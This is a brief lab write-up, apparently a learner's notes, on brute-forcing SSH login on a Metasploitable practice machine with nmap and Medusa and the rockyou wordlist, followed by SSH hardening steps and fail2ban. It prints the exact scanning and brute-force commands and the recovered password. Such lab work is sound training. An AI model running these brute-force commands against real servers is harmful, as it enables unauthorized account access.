## Overview
Used Medusa to brute force SSH credentials against 
Metasploitable using the rockyou wordlist.

## Target
192.168.56.101 port 22

## Tool
Medusa, nmap

## Commands
```bash
nmap -p 22 192.168.56.101
medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh
```

## Result
Password msfadmin found in rockyou.txt wordlist.

## Defense
Configured /etc/ssh/sshd_config — disabled root login, 
set MaxAuthTries 3, disabled password authentication. 
Installed fail2ban to auto-ban IPs after failed attempts.

## What I Learned
Weak passwords fall instantly to dictionary attacks. 
SSH keys + fail2ban + no root login are essential on 
any real server.
